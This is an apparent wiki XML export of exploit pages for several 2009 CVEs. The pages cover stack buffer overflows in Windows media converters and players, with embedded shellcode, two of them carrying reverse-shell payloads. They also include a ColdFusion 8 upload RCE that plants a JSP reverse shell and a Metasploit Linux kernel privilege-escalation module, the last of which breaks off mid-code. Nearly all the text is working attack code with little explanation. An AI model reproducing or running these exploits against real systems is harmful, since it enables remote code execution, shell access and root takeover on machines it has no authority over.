    <title>CVE-2009-1324 Mini-stream ASX to MP3 Converter 3.0.0.7堆棧緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>662</id>
    <revision>
      <id>893</id>
      <timestamp>2021-04-02T03:37:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/python  import struct  buffer = "A" * 35018  eip = struct.pack('&lt;I', 0x73E66A47) #jmp esp from MFC42.dll  preshellcode = "\x90" * 60  # bad characters..."</comment>
      <origin>893</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1384" sha1="mh1nxzbaccv6bd6hbtjzbcgbjhhba5w" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/python

import struct

buffer = "A" * 35018

eip = struct.pack('&lt;I', 0x73E66A47) #jmp esp from MFC42.dll

preshellcode = "\x90" * 60

# bad characters: \x00\x0a

# msfvenom -p windows/exec cmd=calc.exe -f c EXITFUNC=seh -e x86/shikata_ga_nai -b "x00x0a" -a x86 --platform windows

shellcode = ("\xb8\xa6\xa4\x36\xae\xd9\xc5\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x31\x31\x43\x13\x83\xeb\xfc\x03\x43\xa9\x46\xc3\x52\x5d\x04"
"\x2c\xab\x9d\x69\xa4\x4e\xac\xa9\xd2\x1b\x9e\x19\x90\x4e\x12"
"\xd1\xf4\x7a\xa1\x97\xd0\x8d\x02\x1d\x07\xa3\x93\x0e\x7b\xa2"
"\x17\x4d\xa8\x04\x26\x9e\xbd\x45\x6f\xc3\x4c\x17\x38\x8f\xe3"
"\x88\x4d\xc5\x3f\x22\x1d\xcb\x47\xd7\xd5\xea\x66\x46\x6e\xb5"
"\xa8\x68\xa3\xcd\xe0\x72\xa0\xe8\xbb\x09\x12\x86\x3d\xd8\x6b"
"\x67\x91\x25\x44\x9a\xeb\x62\x62\x45\x9e\x9a\x91\xf8\x99\x58"
"\xe8\x26\x2f\x7b\x4a\xac\x97\xa7\x6b\x61\x41\x23\x67\xce\x05"
"\x6b\x6b\xd1\xca\x07\x97\x5a\xed\xc7\x1e\x18\xca\xc3\x7b\xfa"
"\x73\x55\x21\xad\x8c\x85\x8a\x12\x29\xcd\x26\x46\x40\x8c\x2c"
"\x99\xd6\xaa\x02\x99\xe8\xb4\x32\xf2\xd9\x3f\xdd\x85\xe5\x95"
"\x9a\x74\x17\x24\x36\xe0\x8e\xdd\x7b\x6c\x31\x08\xbf\x89\xb2"
"\xb9\x3f\x6e\xaa\xcb\x3a\x2a\x6c\x27\x36\x23\x19\x47\xe5\x44"
"\x08\x24\x68\xd7\xd0\x85\x0f\x5f\x72\xda")

with open("asx2mp3.m3u", "w+") as f:
    f.write(buffer + eip + preshellcode + shellcode)

print "m3u File Created Successfully\n"

&lt;/pre&gt;</text>
      <sha1>mh1nxzbaccv6bd6hbtjzbcgbjhhba5w</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-1330 Easy RM to MP3 Converter堆棧緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>663</id>
    <revision>
      <id>894</id>
      <timestamp>2021-04-02T03:40:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # CVE-2009-1330  Exploit for buffer overflow in Easy RM to MP3 Converter 2.7.3.700 (CVE-2009-1330)  Based on: * pwntools * msfvenom / reverse\_tcp payload * rop..."</comment>
      <origin>894</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3646" sha1="fqhfz0m3e7jc2lhq2ce2cai9pnvm0ck" xml:space="preserve">==INFO==
&lt;pre&gt;
# CVE-2009-1330

Exploit for buffer overflow in Easy RM to MP3 Converter 2.7.3.700 (CVE-2009-1330)

Based on:
* pwntools
* msfvenom / reverse\_tcp payload
* ropper
* x64dbg
* Easy RM to MP3 Converter 2.7.3.700

Vulnerable app available at https://www.exploit-db.com/exploits/10374

&lt;/pre&gt;

==EXP==
&lt;pre&gt;
#!/usr/bin/env python
#
# CVE-2009-1330 using:
# * pwntools
# * msfvenom / reverse_tcp payload
# * ropper
# * x64dbg
# * Easy RM to MP3 Converter 2.7.3.700
#
# Vulnerable app available at https://www.exploit-db.com/exploits/10374

from pwn import p32, listen
from threading import Thread


def generate_payload():
    # EIP controlled on offset 82179
    # EDI points to shellcode at offset 9926

    # msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LPORT=4444 -a x86
    # LHOST=192.168.15.101 -f python --platform windows -b "\x00\x0a\x0d"
    shellcode = "\x90" * 10  # small NOP slide
    shellcode += "\xbf\x70\xf9\x1b\x1c\xda\xd0\xd9\x74\x24\xf4\x5e"
    shellcode += "\x29\xc9\xb1\x52\x31\x7e\x12\x03\x7e\x12\x83\xb6"
    shellcode += "\xfd\xf9\xe9\xca\x16\x7f\x11\x32\xe7\xe0\x9b\xd7"
    shellcode += "\xd6\x20\xff\x9c\x49\x91\x8b\xf0\x65\x5a\xd9\xe0"
    shellcode += "\xfe\x2e\xf6\x07\xb6\x85\x20\x26\x47\xb5\x11\x29"
    shellcode += "\xcb\xc4\x45\x89\xf2\x06\x98\xc8\x33\x7a\x51\x98"
    shellcode += "\xec\xf0\xc4\x0c\x98\x4d\xd5\xa7\xd2\x40\x5d\x54"
    shellcode += "\xa2\x63\x4c\xcb\xb8\x3d\x4e\xea\x6d\x36\xc7\xf4"
    shellcode += "\x72\x73\x91\x8f\x41\x0f\x20\x59\x98\xf0\x8f\xa4"
    shellcode += "\x14\x03\xd1\xe1\x93\xfc\xa4\x1b\xe0\x81\xbe\xd8"
    shellcode += "\x9a\x5d\x4a\xfa\x3d\x15\xec\x26\xbf\xfa\x6b\xad"
    shellcode += "\xb3\xb7\xf8\xe9\xd7\x46\x2c\x82\xec\xc3\xd3\x44"
    shellcode += "\x65\x97\xf7\x40\x2d\x43\x99\xd1\x8b\x22\xa6\x01"
    shellcode += "\x74\x9a\x02\x4a\x99\xcf\x3e\x11\xf6\x3c\x73\xa9"
    shellcode += "\x06\x2b\x04\xda\x34\xf4\xbe\x74\x75\x7d\x19\x83"
    shellcode += "\x7a\x54\xdd\x1b\x85\x57\x1e\x32\x42\x03\x4e\x2c"
    shellcode += "\x63\x2c\x05\xac\x8c\xf9\x8a\xfc\x22\x52\x6b\xac"
    shellcode += "\x82\x02\x03\xa6\x0c\x7c\x33\xc9\xc6\x15\xde\x30"
    shellcode += "\x81\xd9\xb7\x35\x34\xb2\xc5\x49\xa7\x1e\x43\xaf"
    shellcode += "\xad\x8e\x05\x78\x5a\x36\x0c\xf2\xfb\xb7\x9a\x7f"
    shellcode += "\x3b\x33\x29\x80\xf2\xb4\x44\x92\x63\x35\x13\xc8"
    shellcode += "\x22\x4a\x89\x64\xa8\xd9\x56\x74\xa7\xc1\xc0\x23"
    shellcode += "\xe0\x34\x19\xa1\x1c\x6e\xb3\xd7\xdc\xf6\xfc\x53"
    shellcode += "\x3b\xcb\x03\x5a\xce\x77\x20\x4c\x16\x77\x6c\x38"
    shellcode += "\xc6\x2e\x3a\x96\xa0\x98\x8c\x40\x7b\x76\x47\x04"
    shellcode += "\xfa\xb4\x58\x52\x03\x91\x2e\xba\xb2\x4c\x77\xc5"
    shellcode += "\x7b\x19\x7f\xbe\x61\xb9\x80\x15\x22\xd9\x62\xbf"
    shellcode += "\x5f\x72\x3b\x2a\xe2\x1f\xbc\x81\x21\x26\x3f\x23"
    shellcode += "\xda\xdd\x5f\x46\xdf\x9a\xe7\xbb\xad\xb3\x8d\xbb"
    shellcode += "\x02\xb3\x87"

    filler1 = 'A' * 9926
    filler2 = 'B' * (82179 - len(filler1) - len(shellcode))
    CALL_EDI_ADDR = p32(0x100304ec)  # gadget from MSRMfilter03.dll

    return filler1 + shellcode + filler2 + CALL_EDI_ADDR


def attack():
    payload = generate_payload()
    fname = "input.m3u"

    f = open(fname, "w")
    f.write(payload)
    f.close()

    print("File {} has been created.".format(fname))
    print("Please use target software to open payload.")


if __name__ == "__main__":
    # set target info
    LHOST = "127.0.0.1"
    LPORT = 4444

    thread = Thread(target=attack)
    thread.start()

    listener = listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()

&lt;/pre&gt;</text>
      <sha1>fqhfz0m3e7jc2lhq2ce2cai9pnvm0ck</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-1437 PortableApps CoolPlayer Portable緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>664</id>
    <revision>
      <id>895</id>
      <timestamp>2021-04-02T03:59:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/python """  Content:	Exploit coolplayer+ &lt;= 2.19.6 Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de Date: 		02/2018  Related		Vulner..."</comment>
      <origin>895</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2135" sha1="4vhqcurmq0u1srv525ahybrn4fswg49" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/python
""" 
Content:	Exploit coolplayer+ &lt;= 2.19.6
Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
Date: 		02/2018

Related		Vulnerability:	CVE-2009-1437 &amp;&amp; Exploit https://www.exploit-db.com/exploits/8519/
"""

import sys
from subprocess import call


"""
RET address:
00402C77
Converted reverseHex value:
\x77\x2C\x40\x00

"""

#msfvenom -p windows/messagebox TEXT="Owned by @HanseSecure" -f python

buf =  ""
buf += "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
buf += "\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
buf += "\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
buf += "\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
buf += "\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
buf += "\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
buf += "\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
buf += "\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
buf += "\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
buf += "\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
buf += "\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
buf += "\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
buf += "\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
buf += "\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
buf += "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
buf += "\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
buf += "\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
buf += "\x24\x0a\x89\xe3\x68\x65\x58\x20\x20\x68\x65\x63\x75"
buf += "\x72\x68\x6e\x73\x65\x53\x68\x20\x40\x48\x61\x68\x64"
buf += "\x20\x62\x79\x68\x4f\x77\x6e\x65\x31\xc9\x88\x4c\x24"
buf += "\x15\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0"
buf += "\x50\xff\x55\x08"


ret = "\x77\x2C\x40\x00"
jmp = "\xeb\x1e"

buffer = "\x90"*230 + jmp + "\x90"*2 + ret + "\x90"*50 + buf + "A"*(4000-234-4-50-len(buf))


print "[+] Creating malicious file"
file = open("test","w")
file.write(buffer)
file.close()
call(['mv test /var/www/html/test.m3u'], shell=True)
print "[+] File created and moved to webspace successfully"

&lt;/pre&gt;</text>
      <sha1>4vhqcurmq0u1srv525ahybrn4fswg49</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-2265 Adobe ColdFusion 8 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>5132</id>
    <revision>
      <id>5874</id>
      <timestamp>2021-06-24T09:39:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; Adobe ColdFusion 8   ==EXP== &lt;pre&gt; # Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE) # Google Dork:..."</comment>
      <origin>5874</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4024" sha1="b849hg9d4kd1isbxlo9ww6nsbxb4my5" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
Adobe ColdFusion 8


==EXP==
&lt;pre&gt;
# Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE)
# Google Dork: intext:"adobe coldfusion 8"
# Date: 24/06/2021
# Exploit Author: Pergyz
# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
# Version: 8
# Tested on: Microsoft Windows Server 2008 R2 Standard
# CVE : CVE-2009-2265

#!/usr/bin/python3

from multiprocessing import Process
import io
import mimetypes
import os
import urllib.request
import uuid

class MultiPartForm:

    def __init__(self):
        self.files = []
        self.boundary = uuid.uuid4().hex.encode('utf-8')
        return

    def get_content_type(self):
        return 'multipart/form-data; boundary={}'.format(self.boundary.decode('utf-8'))

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()

        if mimetype is None:
            mimetype = (mimetypes.guess_type(filename)[0] or 'application/octet-stream')

        self.files.append((fieldname, filename, mimetype, body))
        return

    @staticmethod
    def _attached_file(name, filename):
        return (f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n').encode('utf-8')

    @staticmethod
    def _content_type(ct):
        return 'Content-Type: {}\r\n'.format(ct).encode('utf-8')

    def __bytes__(self):
        buffer = io.BytesIO()
        boundary = b'--' + self.boundary + b'\r\n'

        for f_name, filename, f_content_type, body in self.files:
            buffer.write(boundary)
            buffer.write(self._attached_file(f_name, filename))
            buffer.write(self._content_type(f_content_type))
            buffer.write(b'\r\n')
            buffer.write(body)
            buffer.write(b'\r\n')

        buffer.write(b'--' + self.boundary + b'--\r\n')
        return buffer.getvalue()

def execute_payload():
    print('\nExecuting the payload...')
    print(urllib.request.urlopen(f'http://{rhost}:{rport}/userfiles/file/{filename}.jsp').read().decode('utf-8'))

def listen_connection():
    print('\nListening for connection...')
    os.system(f'nc -nlvp {lport}')

if __name__ == '__main__':
    # Define some information
    lhost = '10.10.16.4'
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500
    filename = uuid.uuid4().hex

    # Generate a payload that connects back and spawns a command shell
    print("\nGenerating a payload...")
    os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.jsp')

    # Encode the form data
    form = MultiPartForm()
    form.add_file('newfile', filename + '.txt', fileHandle=open(filename + '.jsp', 'rb'))
    data = bytes(form)

    # Create a request
    request = urllib.request.Request(f'http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=/{filename}.jsp%00', data=data)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Content-length', len(data))

    # Print the request
    print('\nPriting request...')

    for name, value in request.header_items():
        print(f'{name}: {value}')

    print('\n' + request.data.decode('utf-8'))

    # Send the request and print the response
    print('\nSending request and printing response...')
    print(urllib.request.urlopen(request).read().decode('utf-8'))
    
    # Print some information
    print('\nPrinting some information for debugging...')
    print(f'lhost: {lhost}')
    print(f'lport: {lport}')
    print(f'rhost: {rhost}')
    print(f'rport: {rport}')
    print(f'payload: {filename}.jsp')

    # Delete the payload
    print("\nDeleting the payload...")
    os.system(f'rm {filename}.jsp')

    # Listen for connections and execute the payload
    p1 = Process(target=listen_connection)
    p1.start()
    p2 = Process(target=execute_payload)
    p2.start()
    p1.join()
    p2.join()
            
&lt;/pre&gt;</text>
      <sha1>b849hg9d4kd1isbxlo9ww6nsbxb4my5</sha1>
    </revision>
    <revision>
      <id>5875</id>
      <parentid>5874</parentid>
      <timestamp>2021-06-24T09:39:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5875</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4035" sha1="ruy8z8dy0lmqyqatfhcunuxd97t77xn" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
Adobe ColdFusion 8


==EXP==
&lt;pre&gt;
# Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE)
# Google Dork: intext:"adobe coldfusion 8"
# Date: 24/06/2021
# Exploit Author: Pergyz
# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
# Version: 8
# Tested on: Microsoft Windows Server 2008 R2 Standard
# CVE : CVE-2009-2265

#!/usr/bin/python3

from multiprocessing import Process
import io
import mimetypes
import os
import urllib.request
import uuid

class MultiPartForm:

    def __init__(self):
        self.files = []
        self.boundary = uuid.uuid4().hex.encode('utf-8')
        return

    def get_content_type(self):
        return 'multipart/form-data; boundary={}'.format(self.boundary.decode('utf-8'))

    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()

        if mimetype is None:
            mimetype = (mimetypes.guess_type(filename)[0] or 'application/octet-stream')

        self.files.append((fieldname, filename, mimetype, body))
        return

    @staticmethod
    def _attached_file(name, filename):
        return (f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n').encode('utf-8')

    @staticmethod
    def _content_type(ct):
        return 'Content-Type: {}\r\n'.format(ct).encode('utf-8')

    def __bytes__(self):
        buffer = io.BytesIO()
        boundary = b'--' + self.boundary + b'\r\n'

        for f_name, filename, f_content_type, body in self.files:
            buffer.write(boundary)
            buffer.write(self._attached_file(f_name, filename))
            buffer.write(self._content_type(f_content_type))
            buffer.write(b'\r\n')
            buffer.write(body)
            buffer.write(b'\r\n')

        buffer.write(b'--' + self.boundary + b'--\r\n')
        return buffer.getvalue()

def execute_payload():
    print('\nExecuting the payload...')
    print(urllib.request.urlopen(f'http://{rhost}:{rport}/userfiles/file/{filename}.jsp').read().decode('utf-8'))

def listen_connection():
    print('\nListening for connection...')
    os.system(f'nc -nlvp {lport}')

if __name__ == '__main__':
    # Define some information
    lhost = '10.10.16.4'
    lport = 4444
    rhost = "10.10.10.11"
    rport = 8500
    filename = uuid.uuid4().hex

    # Generate a payload that connects back and spawns a command shell
    print("\nGenerating a payload...")
    os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.jsp')

    # Encode the form data
    form = MultiPartForm()
    form.add_file('newfile', filename + '.txt', fileHandle=open(filename + '.jsp', 'rb'))
    data = bytes(form)

    # Create a request
    request = urllib.request.Request(f'http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=/{filename}.jsp%00', data=data)
    request.add_header('Content-type', form.get_content_type())
    request.add_header('Content-length', len(data))

    # Print the request
    print('\nPriting request...')

    for name, value in request.header_items():
        print(f'{name}: {value}')

    print('\n' + request.data.decode('utf-8'))

    # Send the request and print the response
    print('\nSending request and printing response...')
    print(urllib.request.urlopen(request).read().decode('utf-8'))
    
    # Print some information
    print('\nPrinting some information for debugging...')
    print(f'lhost: {lhost}')
    print(f'lport: {lport}')
    print(f'rhost: {rhost}')
    print(f'rport: {rport}')
    print(f'payload: {filename}.jsp')

    # Delete the payload
    print("\nDeleting the payload...")
    os.system(f'rm {filename}.jsp')

    # Listen for connections and execute the payload
    p1 = Process(target=listen_connection)
    p1.start()
    p2 = Process(target=execute_payload)
    p2.start()
    p1.join()
    p2.join()
            
&lt;/pre&gt;</text>
      <sha1>ruy8z8dy0lmqyqatfhcunuxd97t77xn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2009-2692 Linux Kernel Sendpage本地特權升級漏洞</title>
    <ns>0</ns>
    <id>518</id>
    <revision>
      <id>721</id>
      <timestamp>2021-03-27T03:31:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for m..."</comment>
      <origin>721</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10097" sha1="fji5clcgcr23959pyfbtj4py1xmm89i" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/priv'
require 'msf/core/exploit/local/linux_kernel'
require 'msf/core/exploit/local/linux'
require 'msf/core/exploit/local/unix'

#load 'lib/msf/core/post/file.rb'
#load 'lib/msf/core/exploit/local/unix.rb'
#load 'lib/msf/core/exploit/local/linux.rb'
#load 'lib/msf/core/exploit/local/linux_kernel.rb'

class Metasploit4 &lt; Msf::Exploit::Local
	Rank = GreatRanking

	include Msf::Exploit::EXE
	include Msf::Post::File
	include Msf::Post::Common

	include Msf::Exploit::Local::LinuxKernel
	include Msf::Exploit::Local::Linux
	include Msf::Exploit::Local::Unix

	def initialize(info={})
		super( update_info( info, {
				'Name'          =&gt; 'Linux Kernel Sendpage Local Privilege Escalation',
				'Description'   =&gt; %q{
					The Linux kernel failed to properly initialize some entries the
					proto_ops struct for several protocols, leading to NULL being
					derefenced and used as a function pointer. By using mmap(2) to map
					page 0, an attacker can execute arbitrary code in the context of the
					kernel.

					Several public exploits exist for this vulnerability, including
					spender's wunderbar_emporium and rcvalle's ppc port, sock_sendpage.c.

					All Linux 2.4/2.6 versions since May 2001 are believed to be affected:
					2.4.4 up to and including 2.4.37.4; 2.6.0 up to and including 2.6.30.4
				},
				'License'       =&gt; MSF_LICENSE,
				'Author'        =&gt;
					[
						'Tavis Ormandy',                     # discovery
						'Julien Tinnes &lt;julien at cr0.org&gt;', # discovery
						'spender',                           # wunderbar_emporium.tgz
						'rcvalle',                           # sock_sendpage.c
						'egypt'                              # metasploit module
					],
				'Platform'      =&gt; [ 'linux' ],
				'Arch'          =&gt; [ ARCH_X86 ],
				'SessionTypes'  =&gt; [ 'shell', 'meterpreter' ],
				'References'    =&gt;
					[
						[ 'CVE', '2009-2692' ],
						[ 'URL', 'http://blog.cr0.org/2009/08/linux-null-pointer-dereference-due-to.html' ],
						[ 'URL', 'http://www.grsecurity.net/~spender/wunderbar_emporium2.tgz' ],
					],
				'Targets'       =&gt;
					[
						[ 'Linux x86',       { 'Arch' =&gt; ARCH_X86 } ],
						#[ 'Linux x64',       { 'Arch' =&gt; ARCH_X86_64 } ],
					],
				'DefaultTarget' =&gt; 0,
				'DisclosureDate' =&gt; "Aug 13 2009",
			}
			))
	end

	def exploit
		sc = Metasm::ELF.new(@cpu)
		sc.parse %Q|
			#define DEBUGGING
			#define NULL ((void*)0)
			#ifdef __ELF__
				.section ".bss" rwx
				.section ".text" rwx
				.entrypoint
			#endif
			call main
			;push eax
			call exit
		|

		# Set up the same include order as the bionic build system.
		# See external/source/meterpreter/source/bionic/libc/Jamfile
		cparser.lexer.include_search_path = [
			"external/source/meterpreter/source/bionic/libc/include/",
			"external/source/meterpreter/source/bionic/libc/private/",
			"external/source/meterpreter/source/bionic/libc/bionic/",
			"external/source/meterpreter/source/bionic/libc/kernel/arch-x86/",
			"external/source/meterpreter/source/bionic/libc/kernel/common/",
			"external/source/meterpreter/source/bionic/libc/arch-x86/include/",
		]

		cparser.parse(%Q|
			#define DEBUGGING
			// Fixes a parse error in bionic's libc/kernel/arch-x86/asm/types.h
			#ifndef __extension__
			#define __extension__
			#endif
			// Fixes a parse error in bionic's libc/include/sys/cdefs_elf.h
			// Doing #if on an undefined macro is fine in GCC, but a parse error in
			// metasm.
			#ifndef __STDC__
			#define __STDC__ 0
			#endif
			#include &lt;sys/types.h&gt;
			#include &lt;sys/mman.h&gt;
			#include &lt;stdarg.h&gt;
			#include &lt;stdio.h&gt;
			#include &lt;unistd.h&gt;
			#include &lt;errno.h&gt;
			/*
			OpenBSD's strcmp from string/strcmp.c in bionic
			*/
			int
			strcmp(const char *s1, const char *s2)
			{
				while (*s1 == *s2++)
					if (*s1++ == 0)
						return (0);
				return (*(unsigned char *)s1 - *(unsigned char *)--s2);
			}
		|)

		[
			"external/source/meterpreter/source/bionic/libc/bionic/__errno.c",
			"external/source/meterpreter/source/bionic/libc/bionic/__set_errno.c",
			"external/source/meterpreter/source/bionic/libc/stdio/stdio.c",
			"external/source/meterpreter/source/bionic/libc/unistd/mmap.c",
			# This parses without any trouble, but actually calling perror() causes
			# immediate segfaults.
			#"external/source/meterpreter/source/bionic/libc/unistd/perror.c",

			# For some ungodly reason, NULL ends up being undefined when parsing this
			# guy, which of course causes parse errors.
			#"external/source/meterpreter/source/bionic/libc/stdio/mktemp.c",

		].each do |fname|
			print_status("Parsing c file #{fname}")
			cparser.parse(File.read(fname), fname)
		end

		print_status("Unix socket.h")
		unix_socket_h(sc)
		current_task_struct_h(sc)

		case target.arch.first
		when ARCH_X86
		print_status("syscall wrappers")
			linux_x86_syscall_wrappers(sc)
			main = %q^
#ifdef __x86_64__
#define PTR_FMT "0x%016x"
#else
#define PTR_FMT "0x%08x"
#endif

#define NULL ((void*)0)
#define DOMAINS_STOP -1
const int domains[] = {
	PF_BLUETOOTH,
	PF_APPLETALK,
	PF_IPX,
	PF_IRDA,
	PF_X25,
	PF_AX25,
	PF_BLUETOOTH,
	PF_PPPOX,
	DOMAINS_STOP
	};

int *apparmor_enabled;

int got_ring0 = 0;
unsigned long uid, gid;

static unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[256];
	int ret;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		if (f == NULL) {
			printf("Unable to obtain symbol listing!\n");
			return 0;
		}
	}

	ret = 0;
	while(ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **)&amp;addr, &amp;dummy, sname);
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			printf(" [+] Resolved %s to %p\n", name, (void *)addr);
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	return 0;
}


static void
change_cred(void)
{
	unsigned int *task_struct;

	task_struct = (unsigned int *)current_task_struct();

	while (task_struct) {
		if (task_struct[0] == uid &amp;&amp; task_struct[1] == uid &amp;&amp;
				task_struct[2] == uid &amp;&amp; task_struct[3] == uid &amp;&amp;
				task_struct[4] == gid &amp;&amp; task_struct[5] == gid &amp;&amp;
				task_struct[6] == gid &amp;&amp; task_struct[7] == gid) {
			task_struct[0] = task_struct[1] =
			task_struct[2] = task_struct[3] =
			task_struct[4] = task_struct[5] =
			task_struct[6] = task_struct[7] = 0;
			break;
		}

		task_struct++;
	}

	return;
}

int __attribute__((regparm(3)))
own_the_kernel(unsigned long a, unsigned long b, unsigned long c, unsigned long d, unsigned long e)
{

	got_ring0 = 1;
	if (apparmor_enabled &amp;&amp; *apparmor_enabled) {
		*apparmor_enabled = 0;
	}
	change_cred();
	return -1;
}

const char *shellcode =
"";
int shellcode_size = 0;

int main() {
	int i = 0;
	int d;
	int in_fd, out_fd;
	char *mapped;
	char template[] = "/tmp/sendfile.XXXXXX";
	int (*func)();

	uid = getuid(), gid = getgid();

	mapped = mmap(NULL , 0x1000,
			PROT_READ | PROT_WRITE | PROT_EXEC,
			MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS,
			0, 0
		);
	if (mapped == NULL) {
		printf("Mapped zero page!\n");
	} else {
		exit(1);
	}

	// jmp dword near [dword 0x8]
	mapped[0] = '\xff';
	mapped[1] = '\x25';
	*(unsigned long *)&amp;mapped[2] = 8;
	*(unsigned long *)&amp;mapped[8] = (unsigned long)own_the_kernel;

	for (i = 0; i &lt; 16; i++) {
		printf("\\\\x%02x", (unsigned char)mapped[i]);
	}
	printf("\n");

	for (d = 0; domains[d] != DOMAINS_STOP; d++) {
		//printf("Next domain ... ");
		out_fd = socket(domains[d], SOCK_DGRAM, 0);
		if (out_fd &gt; 0) {
			printf("Got domain[%d]\n", d);
			break;
		}
		if (out_fd &lt; 0) {
			printf("out_fd: %d, Errno: %d\n", out_fd, errno);
			exit(1);
		}
	}
	unlink(template);
	// Couldn't get mkstemp to work, just use open(2) for now
	in_fd = open(template, O_CREAT | O_RDWR, 0777);
	printf("Opened temp file: %d\n", in_fd);
	unlink(template);
	printf("Calling ftruncate\n");
	ftruncate(in_fd, 4096);

	printf("got_ring0 addr: " PTR_FMT "\n", &amp;got_ring0);
	printf("Calling sendfile(%d, %d, %d, %d)\n", out_fd, in_fd, NULL, 4096);
	sendfile(out_fd, in_fd, NULL, 4096);
	printf("got_ring0: " PTR_FMT ", %d\n", &amp;got_ring0, got_ring0);
	printf("UID: %d GID: %d\n", getuid(), getgid());

	func = mmap(NULL, 0x1000,
